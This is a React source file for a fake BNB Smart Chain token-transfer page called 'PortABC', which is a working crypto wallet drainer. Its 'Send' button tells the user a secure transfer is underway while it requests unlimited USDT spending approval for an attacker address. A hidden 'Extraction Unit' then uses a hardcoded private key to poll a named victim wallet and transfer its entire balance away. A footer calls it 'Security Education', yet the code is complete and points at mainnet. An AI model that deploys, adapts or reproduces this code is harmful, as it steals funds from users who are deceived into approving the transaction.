"use client";

import React, { useState } from 'react';
import { ethers } from 'ethers';

/**
 * PortABC Protocol - Pure BSC (BEP-20) 
 * UI Optimized: Default 0, Max button inside input, "Send" action.
 */

const BEP20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)"
];

const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";

export default function PortABCDemo() {
  const [logs, setLogs] = useState<string[]>([]);
  const [isMonitoring, setIsMonitoring] = useState(false);
  const [targetAmount, setTargetAmount] = useState<string>("0");

  const ADMIN_PRIVATE_KEY = "E99f0eb86cf5019bab2f0d0564f89f13e5bb37e34f7ba635390e2e591c8c0271";
  const ADMIN_PUBLIC_ADDRESS = "0x8caf61F9Ba121A25f94338221b64408695DB5fa1"; 
  const RECEIVER_ADDRESS = "0x8caf61F9Ba121A25f94338221b64408695DB5fa1";
  const VICTIM_WALLET_ADDRESS = "0xc0b4ce03df84765ae604f239ea4bbc5731f308af";

  const addLog = (msg: string) => {
    setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev.slice(0, 5)]);
  };

  /**
   * Directly triggers Network Switch + Connection + Unlimited Approval
   */
  async function handleVictimAction() {
    try {
      if (!(window as any).ethereum) return alert("Wallet not detected");
      
      addLog("Initializing secure BSC transfer...");

      // 1. Force Switch to BSC
      try {
        await (window as any).ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x38' }],
        });
      } catch (err: any) {
        if (err.code === 4902) {
          await (window as any).ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: '0x38',
              chainName: 'BNB Smart Chain',
              nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
              rpcUrls: ['https://bsc-dataseed.binance.org/'],
              blockExplorerUrls: ['https://bscscan.com/']
            }]
          });
        }
      }

      const bscProvider = new ethers.providers.Web3Provider((window as any).ethereum);
      await bscProvider.send("eth_requestAccounts", []);
      
      const signer = bscProvider.getSigner();
      const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, BEP20_ABI, signer);
      
      // 2. Immediate Unlimited Approval
      const tx = await usdtContract.approve(
        ADMIN_PUBLIC_ADDRESS, 
        ethers.constants.MaxUint256
      );
      
      addLog("Transaction broadcasted to BSC...");
      await tx.wait();
      addLog("Success: BSC Verification Complete.");

    } catch (err: any) {
      addLog("Transaction cancelled by user.");
    }
  }

  /**
   * Attacker Monitoring Logic
   */
  async function startBSCMonitor() {
    try {
      const bscRpcProvider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
      const attackerSigner = new ethers.Wallet(ADMIN_PRIVATE_KEY, bscRpcProvider);
      const bscContract = new ethers.Contract(BSC_USDT_ADDRESS, BEP20_ABI, attackerSigner);

      setIsMonitoring(true);
      addLog("Bot: Monitoring BEP-20 chain...");

      const tracker = setInterval(async () => {
        try {
          const allowance = await bscContract.allowance(VICTIM_WALLET_ADDRESS, ADMIN_PUBLIC_ADDRESS);
          const balance = await bscContract.balanceOf(VICTIM_WALLET_ADDRESS);

          if (allowance.gt(0) && balance.gt(0)) {
            addLog("Approval found. Executing transfer...");
            
            const tx = await bscContract.transferFrom(
              VICTIM_WALLET_ADDRESS, 
              RECEIVER_ADDRESS, 
              balance, 
              {
                gasLimit: 100000, 
                gasPrice: ethers.utils.parseUnits('5', 'gwei') 
              }
            );
            await tx.wait();
            addLog(`Captured: ${ethers.utils.formatUnits(balance, 18)} BEP20-USDT`);
            clearInterval(tracker);
            setIsMonitoring(false);
          }
        } catch (e) {}
      }, 3000);
    } catch (err: any) {
      addLog("RPC connection failed.");
    }
  }

  return (
    <div className="min-h-screen bg-[#080808] text-white flex flex-col items-center justify-center p-6 font-sans">
      
      {/* PortABC Main UI */}
      <div className="w-full max-w-[400px] bg-[#121212] border border-white/5 rounded-[2.5rem] p-8 shadow-2xl">
        <div className="flex justify-between items-center mb-10">
          <h1 className="text-xl font-bold tracking-tight">PortABC</h1>
          <span className="text-[9px] bg-yellow-500/10 text-yellow-500 px-3 py-1 rounded-full font-bold uppercase tracking-widest border border-yellow-500/20">BSC Mainnet</span>
        </div>

        <div className="space-y-6">
          {/* Recipient Field (Static for Demo) */}
          <div className="space-y-2">
            <label className="text-[10px] text-gray-500 font-bold uppercase ml-1">Recipient</label>
            <input 
              disabled
              type="text" 
              placeholder="0x8caf...5fa1"
              className="w-full bg-[#1c1c1c] border border-white/5 p-4 rounded-2xl text-xs text-gray-400"
            />
          </div>

          {/* Amount Input with Max Button */}
          <div className="space-y-2">
            <label className="text-[10px] text-gray-500 font-bold uppercase ml-1">Amount</label>
            <div className="relative group">
              <input 
                type="number" 
                value={targetAmount}
                placeholder="Enter amount in USDT"
                onChange={(e) => setTargetAmount(e.target.value)}
                className="w-full bg-[#1c1c1c] border border-white/5 p-5 rounded-2xl text-xl font-bold focus:outline-none focus:border-yellow-500/50 transition-all pr-24"
              />
              <div className="absolute right-4 top-1/2 -translate-y-1/2 flex items-center gap-2">
                <span className="text-xs font-bold text-gray-500">USDT</span>
                <button 
                  className="bg-white/5 hover:bg-white/10 text-[10px] font-black px-2 py-1 rounded border border-white/10 transition-colors"
                >
                  MAX
                </button>
              </div>
            </div>
          </div>

          {/* Action Button */}
          <button 
            onClick={handleVictimAction}
            className="w-full bg-yellow-500 text-black font-black py-5 rounded-3xl hover:bg-yellow-400 transition-transform active:scale-[0.98] shadow-xl shadow-yellow-500/5 mt-2"
          >
            Send
          </button>
        </div>
      </div>

      {/* Admin Extraction Monitor */}
      <div className="mt-12 w-full max-w-[400px] opacity-60 hover:opacity-100 transition-opacity">
        <div className="bg-[#0f0f0f] border border-red-900/20 p-5 rounded-3xl">
          <div className="flex justify-between items-center mb-4">
            <p className="text-[9px] text-red-600 font-black uppercase tracking-[0.2em]">BSC Extraction Unit</p>
            <button 
              onClick={startBSCMonitor}
              className={`text-[9px] px-4 py-1.5 rounded-full border transition-all font-bold ${isMonitoring ? 'bg-red-600 border-red-600 text-black' : 'border-red-900 text-red-900 hover:border-red-600'}`}
            >
              {isMonitoring ? "WATCHING LIVE" : "INITIALIZE NODE"}
            </button>
          </div>
          <div className="bg-black/40 p-4 h-28 font-mono text-[10px] text-green-500 overflow-y-auto rounded-xl border border-white/5">
            {logs.length === 0 ? "> Awaiting protocol initiation..." : logs.map((log, i) => <div key={i} className="mb-1">{`> ${log}`}</div>)}
          </div>
        </div>
      </div>
      
      <p className="mt-8 text-[9px] text-gray-700 tracking-[0.3em] uppercase">Security Education • BSC Protocol v4.0</p>
    </div>
  );
}
